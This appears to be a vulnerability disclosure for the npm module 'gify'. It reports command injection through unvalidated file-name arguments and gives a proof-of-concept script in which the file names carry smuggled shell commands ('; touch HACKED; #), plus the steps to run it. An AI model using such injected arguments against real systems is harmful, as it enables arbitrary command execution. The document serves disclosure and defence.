# Description

The `gify` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executed, leading to `arbitrary command injection`

# POC

1. Create the following PoC file:

```js
// poc.js
var gify = require("gify");
gify("out.mp4\"`'; touch HACKED; #", 'out.gif\';touch HACKED; #');;
```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i gify # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
